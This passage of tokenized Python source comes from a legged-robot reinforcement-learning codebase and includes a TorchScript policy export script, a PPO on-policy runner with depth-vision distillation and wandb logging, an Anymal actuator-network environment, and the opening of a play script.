to ( device ) <EOL> load_path , checkpoint = get_load_path ( root = load_run , checkpoint = checkpoint ) <EOL> load_run = os . path . dirname ( load_path ) <EOL> print ( f"<STR_LIT>" ) <EOL> ac_state_dict = torch . load ( load_path , map_location = device ) <EOL> policy . actor . load_state_dict ( ac_state_dict [ '<STR_LIT>' ] , strict = True ) <EOL> policy . estimator . load_state_dict ( ac_state_dict [ '<STR_LIT>' ] ) <EOL> policy = policy . to ( device ) <EOL> if not os . path . exists ( os . path . join ( load_run , "<STR_LIT>" ) ) : <EOL> os . mkdir ( os . path . join ( load_run , "<STR_LIT>" ) ) <EOL> state_dict = { '<STR_LIT>' : ac_state_dict [ '<STR_LIT>' ] } <EOL> torch . save ( state_dict , os . path . join ( load_run , "<STR_LIT>" , args . exptid + "<STR_LIT>" + str ( checkpoint ) + "<STR_LIT>" ) ) <EOL> policy . eval ( ) <EOL> with torch . no_grad ( ) : <EOL> num_envs = <NUM_LIT> <EOL> obs_input = torch . ones ( num_envs , n_proprio + num_scan + n_priv_explicit + n_priv_latent + history_len * n_proprio , device = device ) <EOL> depth_latent = torch . ones ( <NUM_LIT> , <NUM_LIT> , device = device ) <EOL> test = policy ( obs_input , depth_latent ) <EOL> traced_policy = torch . jit . trace ( policy , ( obs_input , depth_latent ) ) <EOL> save_path = os . path . join ( load_run , "<STR_LIT>" , args . exptid + "<STR_LIT>" + str ( checkpoint ) + "<STR_LIT>" ) <EOL> traced_policy . save ( save_path ) <EOL> print ( "<STR_LIT>" , os . path . abspath ( save_path ) ) <EOL> if __name__ == '<STR_LIT>' : <EOL> parser = argparse . ArgumentParser ( ) <EOL> parser . add_argument ( '<STR_LIT>' , type = str ) <EOL> parser . add_argument ( '<STR_LIT>' , type = int , default = - <NUM_LIT> ) <EOL> parser . add_argument ( '<STR_LIT>' , action = '<STR_LIT>' ) <EOL> args = parser . parse_args ( ) <EOL> play ( args ) <EOL> </s>
<s> import time <EOL> import os <EOL> from collections import deque <EOL> import statistics <EOL> import torch <EOL> import torch . optim as optim <EOL> import wandb <EOL> import datetime <EOL> from rsl_rl . algorithms import PPO <EOL> from rsl_rl . modules import * <EOL> from rsl_rl . env import VecEnv <EOL> import sys <EOL> from copy import copy , deepcopy <EOL> import warnings <EOL> class OnPolicyRunner : <EOL> def __init__ ( self , <EOL> env : VecEnv , <EOL> train_cfg , <EOL> log_dir = None , <EOL> init_wandb = True , <EOL> device = '<STR_LIT>' , ** kwargs ) : <EOL> self . cfg = train_cfg [ "<STR_LIT>" ] <EOL> self . alg_cfg = train_cfg [ "<STR_LIT>" ] <EOL> self . policy_cfg = train_cfg [ "<STR_LIT>" ] <EOL> self . estimator_cfg = train_cfg [ "<STR_LIT>" ] <EOL> self . depth_encoder_cfg = train_cfg [ "<STR_LIT>" ] <EOL> self . device = device <EOL> self . env = env <EOL> print ( "<STR_LIT>" ) <EOL> actor_critic : ActorCriticRMA = ActorCriticRMA ( self . env . cfg . env . n_proprio , <EOL> self . env . cfg . env . n_scan , <EOL> self . env . num_obs , <EOL> self . env . cfg . env . n_priv_latent , <EOL> self . env . cfg . env . n_priv , <EOL> self . env . cfg . env . history_len , <EOL> self . env . num_actions , <EOL> ** self . policy_cfg ) . to ( self . device ) <EOL> estimator = Estimator ( input_dim = env . cfg . env . n_proprio , output_dim = env . cfg . env . n_priv , hidden_dims = self . estimator_cfg [ "<STR_LIT>" ] ) . to ( self . device ) <EOL> self . if_depth = self . depth_encoder_cfg [ "<STR_LIT>" ] <EOL> if self . if_depth : <EOL> depth_backbone = DepthOnlyFCBackbone58x87 ( env . cfg . env . n_proprio , <EOL> self . policy_cfg [ "<STR_LIT>" ] [ - <NUM_LIT> ] , <EOL> self . depth_encoder_cfg [ "<STR_LIT>" ] , <EOL> ) <EOL> depth_encoder = RecurrentDepthBackbone ( depth_backbone , env . cfg ) . to ( self . device ) <EOL> depth_actor = deepcopy ( actor_critic . actor ) <EOL> else : <EOL> depth_encoder = None <EOL> depth_actor = None <EOL> alg_class = eval ( self . cfg [ "<STR_LIT>" ] ) <EOL> self . alg : PPO = alg_class ( actor_critic , <EOL> estimator , self . estimator_cfg , <EOL> depth_encoder , self . depth_encoder_cfg , depth_actor , <EOL> device = self . device , ** self . alg_cfg ) <EOL> self . num_steps_per_env = self . cfg [ "<STR_LIT>" ] <EOL> self . save_interval = self . cfg [ "<STR_LIT>" ] <EOL> self . dagger_update_freq = self . alg_cfg [ "<STR_LIT>" ] <EOL> self . alg . init_storage ( <EOL> self . env . num_envs , <EOL> self . num_steps_per_env , <EOL> [ self . env . num_obs ] , <EOL> [ self . env . num_privileged_obs ] , <EOL> [ self . env . num_actions ] , <EOL> ) <EOL> self . learn = self . learn_RL if not self . if_depth else self . learn_vision <EOL> self . log_dir = log_dir <EOL> self . writer = None <EOL> self . tot_timesteps = <NUM_LIT> <EOL> self . tot_time = <NUM_LIT> <EOL> self . current_learning_iteration = <NUM_LIT> <EOL> def learn_RL ( self , num_learning_iterations , init_at_random_ep_len = False ) : <EOL> mean_value_loss = <NUM_LIT> <EOL> mean_surrogate_loss = <NUM_LIT> <EOL> mean_estimator_loss = <NUM_LIT> <EOL> mean_disc_loss = <NUM_LIT> <EOL> mean_disc_acc = <NUM_LIT> <EOL> mean_hist_latent_loss = <NUM_LIT> <EOL> mean_priv_reg_loss = <NUM_LIT> <EOL> priv_reg_coef = <NUM_LIT> <EOL> entropy_coef = <NUM_LIT> <EOL> if init_at_random_ep_len : <EOL> self . env . episode_length_buf = torch . randint_like ( self . env . episode_length_buf , high = int ( self . env . max_episode_length ) ) <EOL> obs = self . env . get_observations ( ) <EOL> privileged_obs = self . env . get_privileged_observations ( ) <EOL> critic_obs = privileged_obs if privileged_obs is not None else obs <EOL> obs , critic_obs = obs . to ( self . device ) , critic_obs . to ( self . device ) <EOL> infos = { } <EOL> infos [ "<STR_LIT>" ] = self . env . depth_buffer . clone ( ) . to ( self . device ) if self . if_depth else None <EOL> self . alg . actor_critic . train ( ) <EOL> ep_infos = [ ] <EOL> rewbuffer = deque ( maxlen = <NUM_LIT> ) <EOL> rew_explr_buffer = deque ( maxlen = <NUM_LIT> ) <EOL> rew_entropy_buffer = deque ( maxlen = <NUM_LIT> ) <EOL> lenbuffer = deque ( maxlen = <NUM_LIT> ) <EOL> cur_reward_sum = torch . zeros ( self . env . num_envs , dtype = torch . float , device = self . device ) <EOL> cur_reward_explr_sum = torch . zeros ( self . env . num_envs , dtype = torch . float , device = self . device ) <EOL> cur_reward_entropy_sum = torch . zeros ( self . env . num_envs , dtype = torch . float , device = self . device ) <EOL> cur_episode_length = torch . zeros ( self . env . num_envs , dtype = torch . float , device = self . device ) <EOL> tot_iter = self . current_learning_iteration + num_learning_iterations <EOL> self . start_learning_iteration = copy ( self . current_learning_iteration ) <EOL> for it in range ( self . current_learning_iteration , tot_iter ) : <EOL> start = time . time ( ) <EOL> hist_encoding = it % self . dagger_update_freq == <NUM_LIT> <EOL> with torch . inference_mode ( ) : <EOL> for i in range ( self . num_steps_per_env ) : <EOL> actions = self . alg . act ( obs , critic_obs , infos , hist_encoding ) <EOL> obs , privileged_obs , rewards , dones , infos = self . env . step ( actions ) <EOL> critic_obs = privileged_obs if privileged_obs is not None else obs <EOL> obs , critic_obs , rewards , dones = obs . to ( self . device ) , critic_obs . to ( self . device ) , rewards . to ( self . device ) , dones . to ( self . device ) <EOL> total_rew = self . alg . process_env_step ( rewards , dones , infos ) <EOL> if self . log_dir is not None : <EOL> if '<STR_LIT>' in infos : <EOL> ep_infos . append ( infos [ '<STR_LIT>' ] ) <EOL> cur_reward_sum += total_rew <EOL> cur_reward_explr_sum += <NUM_LIT> <EOL> cur_reward_entropy_sum += <NUM_LIT> <EOL> cur_episode_length += <NUM_LIT> <EOL> new_ids = ( dones > <NUM_LIT> ) . nonzero ( as_tuple = False ) <EOL> rewbuffer . extend ( cur_reward_sum [ new_ids ] [ : , <NUM_LIT> ] . cpu ( ) . numpy ( ) . tolist ( ) ) <EOL> rew_explr_buffer . extend ( cur_reward_explr_sum [ new_ids ] [ : , <NUM_LIT> ] . cpu ( ) . numpy ( ) . tolist ( ) ) <EOL> rew_entropy_buffer . extend ( cur_reward_entropy_sum [ new_ids ] [ : , <NUM_LIT> ] . cpu ( ) . numpy ( ) . tolist ( ) ) <EOL> lenbuffer . extend ( cur_episode_length [ new_ids ] [ : , <NUM_LIT> ] . cpu ( ) . numpy ( ) . tolist ( ) ) <EOL> cur_reward_sum [ new_ids ] = <NUM_LIT> <EOL> cur_reward_explr_sum [ new_ids ] = <NUM_LIT> <EOL> cur_reward_entropy_sum [ new_ids ] = <NUM_LIT> <EOL> cur_episode_length [ new_ids ] = <NUM_LIT> <EOL> stop = time . time ( ) <EOL> collection_time = stop - start <EOL> start = stop <EOL> self . alg . compute_returns ( critic_obs ) <EOL> mean_value_loss , mean_surrogate_loss , mean_estimator_loss , mean_disc_loss , mean_disc_acc , mean_priv_reg_loss , priv_reg_coef = self . alg . update ( ) <EOL> if hist_encoding : <EOL> print ( "<STR_LIT>" ) <EOL> mean_hist_latent_loss = self . alg . update_dagger ( ) <EOL> stop = time . time ( ) <EOL> learn_time = stop - start <EOL> if self . log_dir is not None : <EOL> self . log ( locals ( ) ) <EOL> if it < <NUM_LIT> : <EOL> if it % self . save_interval == <NUM_LIT> : <EOL> self . save ( os . path . join ( self . log_dir , '<STR_LIT>' . format ( it ) ) ) <EOL> elif it < <NUM_LIT> : <EOL> if it % ( <NUM_LIT> * self . save_interval ) == <NUM_LIT> : <EOL> self . save ( os . path . join ( self . log_dir , '<STR_LIT>' . format ( it ) ) ) <EOL> else : <EOL> if it % ( <NUM_LIT> * self . save_interval ) == <NUM_LIT> : <EOL> self . save ( os . path . join ( self . log_dir , '<STR_LIT>' . format ( it ) ) ) <EOL> ep_infos . clear ( ) <EOL> self . save ( os . path . join ( self . log_dir , '<STR_LIT>' . format ( self . current_learning_iteration ) ) ) <EOL> def learn_vision ( self , num_learning_iterations , init_at_random_ep_len = False ) : <EOL> tot_iter = self . current_learning_iteration + num_learning_iterations <EOL> self . start_learning_iteration = copy ( self . current_learning_iteration ) <EOL> ep_infos = [ ] <EOL> rewbuffer = deque ( maxlen = <NUM_LIT> ) <EOL> lenbuffer = deque ( maxlen = <NUM_LIT> ) <EOL> cur_reward_sum = torch . zeros ( self . env . num_envs , dtype = torch . float , device = self . device ) <EOL> cur_episode_length = torch . zeros ( self . env . num_envs , dtype = torch . float , device = self . device ) <EOL> obs = self . env . get_observations ( ) <EOL> infos = { } <EOL> infos [ "<STR_LIT>" ] = self . env . depth_buffer . clone ( ) . to ( self . device ) [ : , - <NUM_LIT> ] if self . if_depth else None <EOL> infos [ "<STR_LIT>" ] = torch . ones ( self . env . num_envs , dtype = torch . bool , device = self . device ) <EOL> self . alg . depth_encoder . train ( ) <EOL> self . alg . depth_actor . train ( ) <EOL> num_pretrain_iter = <NUM_LIT> <EOL> for it in range ( self . current_learning_iteration , tot_iter ) : <EOL> start = time . time ( ) <EOL> depth_latent_buffer = [ ] <EOL> scandots_latent_buffer = [ ] <EOL> actions_teacher_buffer = [ ] <EOL> actions_student_buffer = [ ] <EOL> yaw_buffer_student = [ ] <EOL> yaw_buffer_teacher = [ ] <EOL> delta_yaw_ok_buffer = [ ] <EOL> for i in range ( self . depth_encoder_cfg [ "<STR_LIT>" ] ) : <EOL> if infos [ "<STR_LIT>" ] != None : <EOL> with torch . no_grad ( ) : <EOL> scandots_latent = self . alg . actor_critic . actor . infer_scandots_latent ( obs ) <EOL> scandots_latent_buffer . append ( scandots_latent ) <EOL> obs_prop_depth = obs [ : , : self . env . cfg . env . n_proprio ] . clone ( ) <EOL> obs_prop_depth [ : , <NUM_LIT> : <NUM_LIT> ] = <NUM_LIT> <EOL> depth_latent_and_yaw = self . alg . depth_encoder ( infos [ "<STR_LIT>" ] . clone ( ) , obs_prop_depth ) <EOL> depth_latent = depth_latent_and_yaw [ : , : - <NUM_LIT> ] <EOL> yaw = <NUM_LIT> * depth_latent_and_yaw [ : , - <NUM_LIT> : ] <EOL> depth_latent_buffer . append ( depth_latent ) <EOL> yaw_buffer_student . append ( yaw ) <EOL> yaw_buffer_teacher . append ( obs [ : , <NUM_LIT> : <NUM_LIT> ] ) <EOL> with torch . no_grad ( ) : <EOL> actions_teacher = self . alg . actor_critic . act_inference ( obs , hist_encoding = True , scandots_latent = None ) <EOL> actions_teacher_buffer . append ( actions_teacher ) <EOL> obs_student = obs . clone ( ) <EOL> obs_student [ infos [ "<STR_LIT>" ] , <NUM_LIT> : <NUM_LIT> ] = yaw . detach ( ) [ infos [ "<STR_LIT>" ] ] <EOL> delta_yaw_ok_buffer . append ( torch . nonzero ( infos [ "<STR_LIT>" ] ) . size ( <NUM_LIT> ) / infos [ "<STR_LIT>" ] . numel ( ) ) <EOL> actions_student = self . alg . depth_actor ( obs_student , hist_encoding = True , scandots_latent = depth_latent ) <EOL> actions_student_buffer . append ( actions_student ) <EOL> if it < num_pretrain_iter : <EOL> obs , privileged_obs , rewards , dones , infos = self . env . step ( actions_teacher . detach ( ) ) <EOL> else : <EOL> obs , privileged_obs , rewards , dones , infos = self . env . step ( actions_student . detach ( ) ) <EOL> critic_obs = privileged_obs if privileged_obs is not None else obs <EOL> obs , critic_obs , rewards , dones = obs . to ( self . device ) , critic_obs . to ( self . device ) , rewards . to ( self . device ) , dones . to ( self . device ) <EOL> if self . log_dir is not None : <EOL> if '<STR_LIT>' in infos : <EOL> ep_infos . append ( infos [ '<STR_LIT>' ] ) <EOL> cur_reward_sum += rewards <EOL> cur_episode_length += <NUM_LIT> <EOL> new_ids = ( dones > <NUM_LIT> ) . nonzero ( as_tuple = False ) <EOL> rewbuffer . extend ( cur_reward_sum [ new_ids ] [ : , <NUM_LIT> ] . cpu ( ) . numpy ( ) . tolist ( ) ) <EOL> lenbuffer . extend ( cur_episode_length [ new_ids ] [ : , <NUM_LIT> ] . cpu ( ) . numpy ( ) . tolist ( ) ) <EOL> cur_reward_sum [ new_ids ] = <NUM_LIT> <EOL> cur_episode_length [ new_ids ] = <NUM_LIT> <EOL> stop = time . time ( ) <EOL> collection_time = stop - start <EOL> start = stop <EOL> delta_yaw_ok_percentage = sum ( delta_yaw_ok_buffer ) / len ( delta_yaw_ok_buffer ) <EOL> scandots_latent_buffer = torch . cat ( scandots_latent_buffer , dim = <NUM_LIT> ) <EOL> depth_latent_buffer = torch . cat ( depth_latent_buffer , dim = <NUM_LIT> ) <EOL> depth_encoder_loss = <NUM_LIT> <EOL> actions_teacher_buffer = torch . cat ( actions_teacher_buffer , dim = <NUM_LIT> ) <EOL> actions_student_buffer = torch . cat ( actions_student_buffer , dim = <NUM_LIT> ) <EOL> yaw_buffer_student = torch . cat ( yaw_buffer_student , dim = <NUM_LIT> ) <EOL> yaw_buffer_teacher = torch . cat ( yaw_buffer_teacher , dim = <NUM_LIT> ) <EOL> depth_actor_loss , yaw_loss = self . alg . update_depth_actor ( actions_student_buffer , actions_teacher_buffer , yaw_buffer_student , yaw_buffer_teacher ) <EOL> stop = time . time ( ) <EOL> learn_time = stop - start <EOL> self . alg . depth_encoder . detach_hidden_states ( ) <EOL> if self . log_dir is not None : <EOL> self . log_vision ( locals ( ) ) <EOL> if ( it - self . start_learning_iteration < <NUM_LIT> and it % self . save_interval == <NUM_LIT> ) or ( it - self . start_learning_iteration < <NUM_LIT> and it % ( <NUM_LIT> * self . save_interval ) == <NUM_LIT> ) or ( it - self . start_learning_iteration >= <NUM_LIT> and it % ( <NUM_LIT> * self . save_interval ) == <NUM_LIT> ) : <EOL> self . save ( os . path . join ( self . log_dir , '<STR_LIT>' . format ( it ) ) ) <EOL> ep_infos . clear ( ) <EOL> def log_vision ( self , locs , width = <NUM_LIT> , pad = <NUM_LIT> ) : <EOL> self . tot_timesteps += self . num_steps_per_env * self . env . num_envs <EOL> self . tot_time += locs [ '<STR_LIT>' ] + locs [ '<STR_LIT>' ] <EOL> iteration_time = locs [ '<STR_LIT>' ] + locs [ '<STR_LIT>' ] <EOL> ep_string = f'<STR_LIT>' <EOL> wandb_dict = { } <EOL> if locs [ '<STR_LIT>' ] : <EOL> for key in locs [ '<STR_LIT>' ] [ <NUM_LIT> ] : <EOL> infotensor = torch . tensor ( [ ] , device = self . device ) <EOL> for ep_info in locs [ '<STR_LIT>' ] : <EOL> if not isinstance ( ep_info [ key ] , torch . Tensor ) : <EOL> ep_info [ key ] = torch . Tensor ( [ ep_info [ key ] ] ) <EOL> if len ( ep_info [ key ] . shape ) == <NUM_LIT> : <EOL> ep_info [ key ] = ep_info [ key ] . unsqueeze ( <NUM_LIT> ) <EOL> infotensor = torch . cat ( ( infotensor , ep_info [ key ] . to ( self . device ) ) ) <EOL> value = torch . mean ( infotensor ) <EOL> wandb_dict [ '<STR_LIT>' + key ] = value <EOL> ep_string += <EOL> mean_std = self . alg . actor_critic . std . mean ( ) <EOL> fps = int ( self . num_steps_per_env * self . env . num_envs / ( locs [ '<STR_LIT>' ] + locs [ '<STR_LIT>' ] ) ) <EOL> wandb_dict [ '<STR_LIT>' ] = locs [ '<STR_LIT>' ] <EOL> wandb_dict [ '<STR_LIT>' ] = locs [ '<STR_LIT>' ] <EOL> wandb_dict [ '<STR_LIT>' ] = locs [ '<STR_LIT>' ] <EOL> wandb_dict [ '<STR_LIT>' ] = locs [ '<STR_LIT>' ] <EOL> wandb_dict [ '<STR_LIT>' ] = mean_std . item ( ) <EOL> wandb_dict [ '<STR_LIT>' ] = fps <EOL> wandb_dict [ '<STR_LIT>' ] = locs [ '<STR_LIT>' ] <EOL> wandb_dict [ '<STR_LIT>' ] = locs [ '<STR_LIT>' ] <EOL> if len ( locs [ '<STR_LIT>' ] ) > <NUM_LIT> : <EOL> wandb_dict [ '<STR_LIT>' ] = statistics . mean ( locs [ '<STR_LIT>' ] ) <EOL> wandb_dict [ '<STR_LIT>' ] = statistics . mean ( locs [ '<STR_LIT>' ] ) <EOL> wandb . log ( wandb_dict , step = locs [ '<STR_LIT>' ] ) <EOL> str = f"<STR_LIT>" <EOL> if len ( locs [ '<STR_LIT>' ] ) > <NUM_LIT> : <EOL> log_string = ( <EOL> ) <EOL> else : <EOL> log_string = ( ) <EOL> log_string += <EOL> log_string += ep_string <EOL> curr_it = locs [ '<STR_LIT>' ] - self . start_learning_iteration <EOL> eta = self . tot_time / ( curr_it + <NUM_LIT> ) * ( locs [ '<STR_LIT>' ] - curr_it ) <EOL> mins = eta // <NUM_LIT> <EOL> secs = eta % <NUM_LIT> <EOL> log_string += ( <EOL> ) <EOL> print ( log_string ) <EOL> def log ( self , locs , width = <NUM_LIT> , pad = <NUM_LIT> ) : <EOL> self . tot_timesteps += self . num_steps_per_env * self . env . num_envs <EOL> self . tot_time += locs [ '<STR_LIT>' ] + locs [ '<STR_LIT>' ] <EOL> iteration_time = locs [ '<STR_LIT>' ] + locs [ '<STR_LIT>' ] <EOL> ep_string = f'<STR_LIT>' <EOL> wandb_dict = { } <EOL> if locs [ '<STR_LIT>' ] : <EOL> for key in locs [ '<STR_LIT>' ] [ <NUM_LIT> ] : <EOL> infotensor = torch . tensor ( [ ] , device = self . device ) <EOL> for ep_info in locs [ '<STR_LIT>' ] : <EOL> if not isinstance ( ep_info [ key ] , torch . Tensor ) : <EOL> ep_info [ key ] = torch . Tensor ( [ ep_info [ key ] ] ) <EOL> if len ( ep_info [ key ] . shape ) == <NUM_LIT> : <EOL> ep_info [ key ] = ep_info [ key ] . unsqueeze ( <NUM_LIT> ) <EOL> infotensor = torch . cat ( ( infotensor , ep_info [ key ] . to ( self . device ) ) ) <EOL> value = torch . mean ( infotensor ) <EOL> wandb_dict [ '<STR_LIT>' + key ] = value <EOL> ep_string += <EOL> mean_std = self . alg . actor_critic . std . mean ( ) <EOL> fps = int ( self . num_steps_per_env * self . env . num_envs / ( locs [ '<STR_LIT>' ] + locs [ '<STR_LIT>' ] ) ) <EOL> wandb_dict [ '<STR_LIT>' ] = [ '<STR_LIT>' ] <EOL> wandb_dict [ '<STR_LIT>' ] = locs [ '<STR_LIT>' ] <EOL> wandb_dict [ '<STR_LIT>' ] = locs [ '<STR_LIT>' ] <EOL> wandb_dict [ '<STR_LIT>' ] = locs [ '<STR_LIT>' ] <EOL> wandb_dict [ '<STR_LIT>' ] = locs [ '<STR_LIT>' ] <EOL> wandb_dict [ '<STR_LIT>' ] = locs [ '<STR_LIT>' ] <EOL> wandb_dict [ '<STR_LIT>' ] = locs [ '<STR_LIT>' ] <EOL> wandb_dict [ '<STR_LIT>' ] = self . alg . learning_rate <EOL> wandb_dict [ '<STR_LIT>' ] = locs [ '<STR_LIT>' ] <EOL> wandb_dict [ '<STR_LIT>' ] = locs [ '<STR_LIT>' ] <EOL> wandb_dict [ '<STR_LIT>' ] = mean_std . item ( ) <EOL> wandb_dict [ '<STR_LIT>' ] = fps <EOL> wandb_dict [ '<STR_LIT>' ] = locs [ '<STR_LIT>' ] <EOL> wandb_dict [ '<STR_LIT>' ] = locs [ '<STR_LIT>' ] <EOL> if len ( locs [ '<STR_LIT>' ] ) > <NUM_LIT> : <EOL> wandb_dict [ '<STR_LIT>' ] = statistics . mean ( locs [ '<STR_LIT>' ] ) <EOL> wandb_dict [ '<STR_LIT>' ] = statistics . mean ( locs [ '<STR_LIT>' ] ) <EOL> wandb_dict [ '<STR_LIT>' ] = wandb_dict [ '<STR_LIT>' ] - wandb_dict [ '<STR_LIT>' ] <EOL> wandb_dict [ '<STR_LIT>' ] = statistics . mean ( locs [ '<STR_LIT>' ] ) <EOL> wandb_dict [ '<STR_LIT>' ] = statistics . mean ( locs [ '<STR_LIT>' ] ) <EOL> wandb . log ( wandb_dict , step = locs [ '<STR_LIT>' ] ) <EOL> str = f"<STR_LIT>" <EOL> if len ( locs [ '<STR_LIT>' ] ) > <NUM_LIT> : <EOL> log_string = ( <EOL> ) <EOL> else : <EOL> log_string = ( <EOL> ) <EOL> log_string += <EOL> log_string += ep_string <EOL> curr_it = locs [ '<STR_LIT>' ] - self . start_learning_iteration <EOL> eta = self . tot_time / ( curr_it + <NUM_LIT> ) * ( locs [ '<STR_LIT>' ] - curr_it ) <EOL> mins = eta // <NUM_LIT> <EOL> secs = eta % <NUM_LIT> <EOL> log_string += ( <EOL> ) <EOL> print ( log_string ) <EOL> def save ( self , path , infos = None ) : <EOL> state_dict = { <EOL> '<STR_LIT>' : self . alg . actor_critic . state_dict ( ) , <EOL> '<STR_LIT>' : self . alg . estimator . state_dict ( ) , <EOL> '<STR_LIT>' : self . alg . optimizer . state_dict ( ) , <EOL> '<STR_LIT>' : self . current_learning_iteration , <EOL> '<STR_LIT>' : infos , <EOL> } <EOL> if self . if_depth : <EOL> state_dict [ '<STR_LIT>' ] = self . alg . depth_encoder . state_dict ( ) <EOL> state_dict [ '<STR_LIT>' ] = self . alg . depth_actor . state_dict ( ) <EOL> torch . save ( state_dict , path ) <EOL> def load ( self , path , load_optimizer = True ) : <EOL> print ( "<STR_LIT>" * <NUM_LIT> ) <EOL> print ( "<STR_LIT>" . format ( path ) ) <EOL> loaded_dict = torch . load ( path , map_location = self . device ) <EOL> self . alg . actor_critic . load_state_dict ( loaded_dict [ '<STR_LIT>' ] ) <EOL> self . alg . estimator . load_state_dict ( loaded_dict [ '<STR_LIT>' ] ) <EOL> if self . if_depth : <EOL> if '<STR_LIT>' not in loaded_dict : <EOL> warnings . warn ( "<STR_LIT>" ) <EOL> else : <EOL> print ( "<STR_LIT>" ) <EOL> self . alg . depth_encoder . load_state_dict ( loaded_dict [ '<STR_LIT>' ] ) <EOL> if '<STR_LIT>' in loaded_dict : <EOL> print ( "<STR_LIT>" ) <EOL> self . alg . depth_actor . load_state_dict ( loaded_dict [ '<STR_LIT>' ] ) <EOL> else : <EOL> print ( "<STR_LIT>" ) <EOL> self . alg . depth_actor . load_state_dict ( self . alg . actor_critic . actor . state_dict ( ) ) <EOL> if load_optimizer : <EOL> self . alg . optimizer . load_state_dict ( loaded_dict [ '<STR_LIT>' ] ) <EOL> print ( "<STR_LIT>" * <NUM_LIT> ) <EOL> return loaded_dict [ '<STR_LIT>' ] <EOL> def get_inference_policy ( self , device = None ) : <EOL> self . alg . actor_critic . eval ( ) <EOL> if device is not None : <EOL> self . alg . actor_critic . to ( device ) <EOL> return self . alg . actor_critic . act_inference <EOL> def get_depth_actor_inference_policy ( self , device = None ) : <EOL> self . alg . depth_actor . eval ( ) <EOL> if device is not None : <EOL> self . alg . depth_actor . to ( device ) <EOL> return self . alg . depth_actor <EOL> def get_actor_critic ( self , device = None ) : <EOL> self . alg . actor_critic . eval ( ) <EOL> if device is not None : <EOL> self . alg . actor_critic . to ( device ) <EOL> return self . alg . actor_critic <EOL> def get_estimator_inference_policy ( self , device = None ) : <EOL> self . alg . estimator . eval ( ) <EOL> if device is not None : <EOL> self . alg . estimator . to ( device ) <EOL> return self . alg . estimator . inference <EOL> def get_depth_encoder_inference_policy ( self , device = None ) : <EOL> self . alg . depth_encoder . eval ( ) <EOL> if device is not None : <EOL> self . alg . depth_encoder . to ( device ) <EOL> return self . alg . depth_encoder <EOL> def get_disc_inference_policy ( self , device = None ) : <EOL> self . alg . discriminator . eval ( ) <EOL> if device is not None : <EOL> self . alg . discriminator . to ( device ) <EOL> return self . alg . discriminator . inference <EOL> </s>
<s> from time import time <EOL> import numpy as np <EOL> import os <EOL> from isaacgym . torch_utils import * <EOL> from isaacgym import gymtorch , gymapi , gymutil <EOL> import torch <EOL> from typing import Tuple , Dict <EOL> from legged_gym . envs import LeggedRobot <EOL> from legged_gym import LEGGED_GYM_ROOT_DIR <EOL> from . mixed_terrains . anymal_c_rough_config import AnymalCRoughCfg <EOL> class Anymal ( LeggedRobot ) : <EOL> cfg : AnymalCRoughCfg <EOL> def __init__ ( self , cfg , sim_params , physics_engine , sim_device , headless ) : <EOL> super ( ) . __init__ ( cfg , sim_params , physics_engine , sim_device , headless ) <EOL> if self . cfg . control . use_actuator_network : <EOL> actuator_network_path = self . cfg . control . actuator_net_file . format ( LEGGED_GYM_ROOT_DIR = LEGGED_GYM_ROOT_DIR ) <EOL> self . actuator_network = torch . jit . load ( actuator_network_path ) . to ( self . device ) <EOL> def reset_idx ( self , env_ids ) : <EOL> super ( ) . reset_idx ( env_ids ) <EOL> self . sea_hidden_state_per_env [ : , env_ids ] = <NUM_LIT> <EOL> self . sea_cell_state_per_env [ : , env_ids ] = <NUM_LIT> <EOL> def _init_buffers ( self ) : <EOL> super ( ) . _init_buffers ( ) <EOL> self . sea_input = torch . zeros ( self . num_envs * self . num_actions , <NUM_LIT> , <NUM_LIT> , device = self . device , requires_grad = False ) <EOL> self . sea_hidden_state = torch . zeros ( <NUM_LIT> , self . num_envs * self . num_actions , <NUM_LIT> , device = self . device , requires_grad = False ) <EOL> self . sea_cell_state = torch . zeros ( <NUM_LIT> , self . num_envs * self . num_actions , <NUM_LIT> , device = self . device , requires_grad = False ) <EOL> self . sea_hidden_state_per_env = self . sea_hidden_state . view ( <NUM_LIT> , self . num_envs , self . num_actions , <NUM_LIT> ) <EOL> self . sea_cell_state_per_env = self . sea_cell_state . view ( <NUM_LIT> , self . num_envs , self . num_actions , <NUM_LIT> ) <EOL> def _compute_torques ( self , actions ) : <EOL> if self . cfg . control . use_actuator_network : <EOL> with torch . inference_mode ( ) : <EOL> self . sea_input [ : , <NUM_LIT> , <NUM_LIT> ] = ( actions * self . cfg . control . action_scale + self . default_dof_pos - self . dof_pos ) . flatten ( ) <EOL> self . sea_input [ : , <NUM_LIT> , <NUM_LIT> ] = self . dof_vel . flatten ( ) <EOL> torques , ( self . sea_hidden_state [ : ] , self . sea_cell_state [ : ] ) = self . actuator_network ( self . sea_input , ( self . sea_hidden_state , self . sea_cell_state ) ) <EOL> return torques <EOL> else : <EOL> return super ( ) . _compute_torques ( actions ) <EOL> </s>
<s> from legged_gym import LEGGED_GYM_ROOT_DIR <EOL> import os <EOL> import code <EOL> import isaacgym <EOL> from legged_gym . envs import * <EOL> from legged_gym . utils import get_args , export_policy_as_jit , task_registry , Logger <EOL> from isaacgym import gymtorch , gymapi , gymutil <EOL> import numpy as np <EOL> import torch <EOL> import cv2 <EOL> from collections import deque <EOL> import statistics <EOL> import faulthandler <EOL> from copy import deepcopy <EOL> import matplotlib . pyplot as plt <EOL> from time import time , sleep <EOL> from legged_gym . utils import webviewer <EOL> from tqdm import tqdm <EOL> def get_load_path ( root , load_run = - <NUM_LIT> , checkpoint = - <NUM_LIT> , model_name_include = "<STR_LIT>" ) : <EOL> if checkpoint == - <NUM_LIT> : <EOL> models = [ file for file in os . listdir ( root ) if model_name_include in file ] <EOL> models . sort ( key = lambda m : '<STR_LIT>' . format ( m ) ) <EOL> model = models [ - <NUM_LIT> ] <EOL> checkpoint = model . split ( "<STR_LIT>" ) [ - <NUM_LIT> ] . split ( "<STR_LIT>" ) [ <NUM_LIT> ] <EOL> return model , checkpoint <EOL> def play ( args ) : <EOL> if args . web : <EOL> web_viewer = webviewer . WebViewer ( ) <EOL> faulthandler . enable ( ) <EOL> exptid = args . exptid <EOL> log_pth = "<STR_LIT>" . format ( args . proj_name ) + args . exptid <EOL> env_cfg , train_cfg = task_registry . get_cfgs ( name = args . task ) <EOL> if args . nodelay : <EOL> env_cfg . domain_rand . action_delay_view = <NUM_LIT> <EOL> env_cfg . env . num_envs = <NUM_LIT> <EOL> env_cfg . env . episode_length_s = <NUM_LIT> <EOL> env_cfg . commands . resampling_time = <NUM_LIT> <EOL> env_cfg . terrain . num_rows = <NUM_LIT> <EOL> env_cfg . terrain . num_cols = <NUM_LIT> <EOL> env_cfg . terrain . height = [ <NUM_LIT> , <NUM_LIT> ] <EOL> env_cfg . terrain 